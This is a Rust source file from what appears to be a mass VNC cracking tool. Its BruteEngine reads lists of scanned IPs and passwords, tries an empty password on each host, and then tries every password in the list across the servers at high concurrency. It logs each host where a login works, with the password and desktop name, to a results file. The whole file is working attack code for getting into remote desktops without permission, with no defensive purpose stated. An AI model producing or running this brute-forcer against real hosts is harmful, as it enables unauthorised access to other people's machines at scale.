use std::sync::{Arc, Mutex};
use std::time::Duration;
use tokio::sync::Semaphore;
use tokio::io::AsyncWriteExt;
use std::io::Write;
use crate::config::Config;
use crate::files::FilesHandler;
use crate::net_tools::NetTools;
use crate::rfb::RFBProtocol;

pub struct BruteEngine {
    config: Arc<Config>,
    files: Arc<FilesHandler>,
    net_tools: Arc<NetTools>,
}

#[derive(Clone)]
struct Server {
    host: String,
    port: u16,
}

impl BruteEngine {
    pub fn new(config: Arc<Config>, files: Arc<FilesHandler>, net_tools: Arc<NetTools>) -> Self {
        Self {
            config,
            files,
            net_tools,
        }
    }

    pub async fn start(&self) -> Result<(), Box<dyn std::error::Error>> {
        let passwords = self.get_passwords()?;
        let servers = self.get_servers()?;
        
        if passwords.is_empty() {
            println!("\n\tThere are no passwords.\n");
            return Ok(());
        }
        
        if servers.is_empty() {
            println!("\n\tThere are no scanned ips.\n");
            return Ok(());
        }
        
        let semaphore = Arc::new(Semaphore::new(self.config.brute_threads.min(2000)));
        let servers_mutex = Arc::new(Mutex::new(servers));
        let results_path = self.files.get_results_path();

        // Async writer for results
        let (tx, mut rx) = tokio::sync::mpsc::channel::<String>(1000);
        let results_writer = tokio::spawn(async move {
            let mut file = tokio::fs::OpenOptions::new()
                .create(true)
                .append(true)
                .open(&results_path)
                .await
                .expect("Failed to open results file");
            while let Some(line) = rx.recv().await {
                if let Err(e) = file.write_all(line.as_bytes()).await {
                    eprintln!("Failed to write result: {}", e);
                }
                let _ = file.write_all(b"\n").await;
                let _ = file.flush().await;
            }
        });
        
        let current_password = Arc::new(Mutex::new(Option::<String>::None));
        let output_kill = Arc::new(Mutex::new(false));
        
        // Output task
        let current_password_clone = current_password.clone();
        let servers_clone = servers_mutex.clone();
        let output_kill_clone = output_kill.clone();
        let output_handle = tokio::spawn(async move {
            loop {
                if *output_kill_clone.lock().unwrap() {
                    break;
                }
                if let Some(pwd) = current_password_clone.lock().unwrap().as_ref() {
                    let servers = servers_clone.lock().unwrap();
                    let msg = format!(" Trying \"{}\" on {} servers", pwd, servers.len());
                    print!("\r{:<80}", msg);
                    std::io::stdout().flush().ok();
                }
                tokio::time::sleep(Duration::from_millis(200)).await;
            }
        });
        
        // Initial null-password check: try empty password for each server and remove successes
        {
            let mut handles_null = Vec::new();
            let servers_guard = servers_mutex.lock().unwrap();
            let servers_snapshot: Vec<Server> = servers_guard.clone();
            drop(servers_guard);

            for server in servers_snapshot {
                let sem_clone = semaphore.clone();
                let servers_mutex_clone = servers_mutex.clone();
                let tx_clone = tx.clone();
                let config_clone = self.config.clone();

                let handle = tokio::spawn(async move {
                    let permit = sem_clone.acquire_owned().await.unwrap();
                    let mut rfb = RFBProtocol::new(&server.host, "", server.port, config_clone.brute_timeout);
                    match rfb.connect().await {
                        Ok(_) => {
                            if rfb.rfb && rfb.connected {
                                let password_display = "null".to_string();
                                let name = rfb.name.as_deref().unwrap_or("");
                                let result_line = format!("{}:{}-{}-[{}]", server.host, server.port, password_display, name);
                                let _ = tx_clone.send(result_line).await;
                                println!("\r[*] {}:{} - {}              ", server.host, server.port, password_display);
                                // Remove server from list
                                {
                                    let mut servers_guard = servers_mutex_clone.lock().unwrap();
                                    servers_guard.retain(|s| s.host != server.host || s.port != server.port);
                                }
                            }
                        }
                        Err(_) => {}
                    }
                    drop(permit);
                });

                handles_null.push(handle);
            }

            for h in handles_null { h.await.ok(); }
        }

        // Brute force tasks
        for password in passwords {
            *current_password.lock().unwrap() = Some(password.clone());
            
            let mut handles = Vec::new();
            let servers_guard = servers_mutex.lock().unwrap();
            let servers_clone: Vec<Server> = servers_guard.clone();
            drop(servers_guard);
            
            for server in servers_clone {
                let semaphore_clone = semaphore.clone();
                let servers_mutex_clone = servers_mutex.clone();
                let tx_clone = tx.clone();
                let config_clone = self.config.clone();
                let password_clone = password.clone();
                
                let handle = tokio::spawn(async move {
                    let permit = semaphore_clone.acquire_owned().await.unwrap();
                    let mut rfb = RFBProtocol::new(
                        &server.host,
                        &password_clone,
                        server.port,
                        config_clone.brute_timeout,
                    );
                    
                    match rfb.connect().await {
                        Ok(_) => {
                            if rfb.rfb && rfb.connected {
                                // Remove server from list
                                {
                                    let mut servers_guard = servers_mutex_clone.lock().unwrap();
                                    servers_guard.retain(|s| s.host != server.host || s.port != server.port);
                                }
                                
                                let password_display = if rfb.null {
                                    "null".to_string()
                                } else {
                                    password_clone.clone()
                                };
                                
                                let name = rfb.name.as_deref().unwrap_or("");
                                let result_line = format!("{}:{}-{}-[{}]", 
                                    server.host, server.port, password_display, name);
                                
                                // Send to async writer
                                let _ = tx_clone.send(result_line).await;
                                
                                println!("\r[*] {}:{} - {}              ", 
                                    server.host, server.port, password_display);
                            }
                        }
                        Err(_) => {
                            // Wrong password or connection failed
                        }
                    }
                    
                    drop(permit);
                });
                
                handles.push(handle);
            }
            
            // Wait for all attempts with this password
            for handle in handles {
                handle.await.ok();
            }
        }
        
        *output_kill.lock().unwrap() = true;
        output_handle.abort();

        // Close results writer and wait for it
        drop(tx);
        results_writer.await.ok();
        
        println!("\n\nDONE! Check \"output/results.txt\" or type \"show results\"!\n");
        
        Ok(())
    }

    fn get_passwords(&self) -> Result<Vec<String>, Box<dyn std::error::Error>> {
        let path = self.files.get_passwords_path();
        if !self.files.file_exists(&path) || self.files.file_empty(&path)? {
            return Ok(Vec::new());
        }
        
        let content = self.files.file_get_contents(&path)?;
        let passwords: Vec<String> = content
            .lines()
            .map(|s| s.trim().to_string())
            .filter(|s| !s.is_empty())
            .collect();
        
        Ok(passwords)
    }

    fn get_servers(&self) -> Result<Vec<Server>, Box<dyn std::error::Error>> {
        let path = self.files.get_ips_path();
        if !self.files.file_exists(&path) || self.files.file_empty(&path)? {
            return Ok(Vec::new());
        }
        
        let content = self.files.file_get_contents(&path)?;
        let mut servers = Vec::new();
        
        for line in content.lines() {
            let line = line.trim();
            if line.is_empty() {
                continue;
            }
            
            if line.matches(':').count() == 1 {
                let parts: Vec<&str> = line.split(':').collect();
                if parts.len() == 2 {
                    if self.net_tools.is_ip(parts[0]) {
                        if let Ok(port) = parts[1].parse::<u16>() {
                            servers.push(Server {
                                host: parts[0].to_string(),
                                port,
                            });
                            continue;
                        }
                    }
                }
            }
            
            // Try as IP only
            if self.net_tools.is_ip(line) {
                servers.push(Server {
                    host: line.to_string(),
                    port: self.config.scan_port,
                });
            }
        }
        
        Ok(servers)
    }
}

